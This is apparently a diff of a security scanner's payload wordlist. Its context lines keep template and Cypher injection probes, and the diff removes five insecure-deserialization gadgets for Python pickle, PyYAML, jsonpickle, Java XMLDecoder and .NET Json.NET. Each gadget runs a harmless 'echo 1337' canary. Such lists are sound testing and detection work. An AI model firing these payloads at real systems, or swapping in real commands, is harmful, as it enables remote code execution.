@@ -180,8 +180,3 @@ ${7*191}${7*191}
 ') RETURN 7*191 AS x //
 ' OR 1=1 RETURN 7*191 //
 ') OR 1=1 RETURN toInteger(7*191) AS x //
-Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VjaG8gMTMzNycKSTAxCnRSLg==
-!!python/object/apply:subprocess.check_output [["echo","1337"]]
-{"py/reduce":[{"py/function":"subprocess.check_output"},{"py/tuple":[["echo","1337"]]}]}
-<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>
-{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
